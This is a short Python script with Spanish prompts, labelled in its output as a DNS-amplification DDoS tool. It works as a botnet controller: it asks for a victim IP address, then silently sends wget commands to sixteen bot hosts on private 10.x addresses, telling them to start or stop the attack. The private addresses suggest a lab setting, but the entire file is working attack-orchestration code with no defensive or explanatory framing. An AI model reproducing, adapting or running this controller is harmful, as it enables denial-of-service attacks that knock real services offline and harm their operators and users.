import subprocess

def iniciar_ataque(ip):
    comandoPbot1 = 'wget --quiet --progress=bar:force http://10.1.1.11:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
    comandoPbot2 = 'wget --quiet --progress=bar:force http://10.1.1.13:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
    comandoPbot4 = 'wget --quiet --progress=bar:force http://10.1.1.16:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
    comandoPbot3 = 'wget --quiet --progress=bar:force http://10.1.1.14:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
    
    comandoPbot5 = 'wget --quiet --progress=bar:force http://10.1.2.11:5200/start/'+ip+'/10.10.25.2 > /dev/null 2>&1 &'
    comandoPbot6 = 'wget --quiet --progress=bar:force http://10.1.2.13:5200/start/'+ip+'/10.10.25.2 > /dev/null 2>&1 &'
    comandoPbot7 = 'wget --quiet --progress=bar:force http://10.1.2.14:5200/start/'+ip+'/10.10.25.2 > /dev/null 2>&1 &'
    comandoPbot8 = 'wget --quiet --progress=bar:force http://10.1.2.15:5200/start/'+ip+'/10.10.25.2 > /dev/null 2>&1 &'
    
    comandoTbot1 = 'wget --quiet --progress=bar:force http://10.1.3.11:5200/start/'+ip+'/10.10.35.2 > /dev/null 2>&1 &'
    comandoTbot2 = 'wget --quiet --progress=bar:force http://10.1.3.13:5200/start/'+ip+'/10.10.35.2 > /dev/null 2>&1 &'
    comandoTbot3 = 'wget --quiet --progress=bar:force http://10.1.3.14:5200/start/'+ip+'/10.10.35.2 > /dev/null 2>&1 &'
    comandoTbot4 = 'wget --quiet --progress=bar:force http://10.1.3.16:5200/start/'+ip+'/10.10.35.2 > /dev/null 2>&1 &'
    
    comandoTbot5 = 'wget --quiet --progress=bar:force http://10.1.4.11:5200/start/'+ip+'/10.10.45.2 > /dev/null 2>&1 &'
    comandoTbot6 = 'wget --quiet --progress=bar:force http://10.1.4.13:5200/start/'+ip+'/10.10.45.2 > /dev/null 2>&1 &'
    comandoTbot7 = 'wget --quiet --progress=bar:force http://10.1.4.14:5200/start/'+ip+'/10.10.45.2 > /dev/null 2>&1 &'
    comandoTbot8 = 'wget --quiet --progress=bar:force http://10.1.4.16:5200/start/'+ip+'/10.10.45.2 > /dev/null 2>&1 &'
    
    subprocess.Popen(comandoPbot1, shell=True)
    subprocess.Popen(comandoPbot2, shell=True)
    subprocess.Popen(comandoPbot3, shell=True)
    subprocess.Popen(comandoPbot4, shell=True)
    subprocess.Popen(comandoPbot5, shell=True)
    subprocess.Popen(comandoPbot6, shell=True)
    subprocess.Popen(comandoPbot7, shell=True)
    subprocess.Popen(comandoPbot8, shell=True)
    subprocess.Popen(comandoTbot1, shell=True)
    subprocess.Popen(comandoTbot2, shell=True)
    subprocess.Popen(comandoTbot3, shell=True)
    subprocess.Popen(comandoTbot4, shell=True)
    subprocess.Popen(comandoTbot5, shell=True)
    subprocess.Popen(comandoTbot6, shell=True)
    subprocess.Popen(comandoTbot7, shell=True)
    subprocess.Popen(comandoTbot8, shell=True)
    print("Ataque iniciado")
    return True

def detener_ataque():
    comandoPbot1 = 'wget --quiet --progress=bar:force http://10.1.1.11:5200/stop > /dev/null 2>&1 &'
    comandoPbot2 = 'wget --quiet --progress=bar:force http://10.1.1.13:5200/stop > /dev/null 2>&1 &'
    comandoPbot3 = 'wget --quiet --progress=bar:force http://10.1.1.14:5200/stop > /dev/null 2>&1 &'
    comandoPbot4 = 'wget --quiet --progress=bar:force http://10.1.1.16:5200/stop > /dev/null 2>&1 &'
    comandoPbot5 = 'wget --quiet --progress=bar:force http://10.1.2.11:5200/stop > /dev/null 2>&1 &'
    comandoPbot6 = 'wget --quiet --progress=bar:force http://10.1.2.13:5200/stop > /dev/null 2>&1 &'
    comandoPbot7 = 'wget --quiet --progress=bar:force http://10.1.2.14:5200/stop > /dev/null 2>&1 &'
    comandoPbot8 = 'wget --quiet --progress=bar:force http://10.1.2.15:5200/stop > /dev/null 2>&1 &'
    comandoTbot1 = 'wget --quiet --progress=bar:force http://10.1.3.11:5200/stop > /dev/null 2>&1 &'
    comandoTbot2 = 'wget --quiet --progress=bar:force http://10.1.3.13:5200/stop > /dev/null 2>&1 &'
    comandoTbot3 = 'wget --quiet --progress=bar:force http://10.1.3.14:5200/stop > /dev/null 2>&1 &'
    comandoTbot4 = 'wget --quiet --progress=bar:force http://10.1.3.16:5200/stop > /dev/null 2>&1 &'
    comandoTbot5 = 'wget --quiet --progress=bar:force http://10.1.4.11:5200/stop > /dev/null 2>&1 &'
    comandoTbot6 = 'wget --quiet --progress=bar:force http://10.1.4.13:5200/stop > /dev/null 2>&1 &'
    comandoTbot7 = 'wget --quiet --progress=bar:force http://10.1.4.14:5200/stop > /dev/null 2>&1 &'
    comandoTbot8 = 'wget --quiet --progress=bar:force http://10.1.4.16:5200/stop > /dev/null 2>&1 &'
    subprocess.Popen(comandoPbot1, shell=True)
    subprocess.Popen(comandoPbot2, shell=True)
    subprocess.Popen(comandoPbot3, shell=True)
    subprocess.Popen(comandoPbot4, shell=True)
    subprocess.Popen(comandoPbot5, shell=True)
    subprocess.Popen(comandoPbot6, shell=True)
    subprocess.Popen(comandoPbot7, shell=True)
    subprocess.Popen(comandoPbot8, shell=True)
    subprocess.Popen(comandoTbot1, shell=True)
    subprocess.Popen(comandoTbot2, shell=True)
    subprocess.Popen(comandoTbot3, shell=True)
    subprocess.Popen(comandoTbot4, shell=True)
    subprocess.Popen(comandoTbot5, shell=True)
    subprocess.Popen(comandoTbot6, shell=True)
    subprocess.Popen(comandoTbot7, shell=True)
    subprocess.Popen(comandoTbot8, shell=True)
    
    print("Ataque detenido")

ataque_iniciado = False


print("DDOS con amplificación por DNS\n")
print("""ʘ‿ʘ\n""")

while True:
    if ataque_iniciado:
        print("1 - Detener ataque")
    else:
        print("1 - Iniciar ataque")
        print("0 - Salir")
    
    opcion = input("Ingrese el número de opción: ")
    
    if opcion == "1":
        if ataque_iniciado:
            detener_ataque()
            ataque_iniciado = False
        else:
            ip = input("Ingrese la IP de la víctima: ")
            ataque_iniciado = iniciar_ataque(ip)
    elif opcion == "0":
        break
    else:
        print("Opción inválida. Por favor, ingrese una opción válida.")

print("Saliendo del programa...")


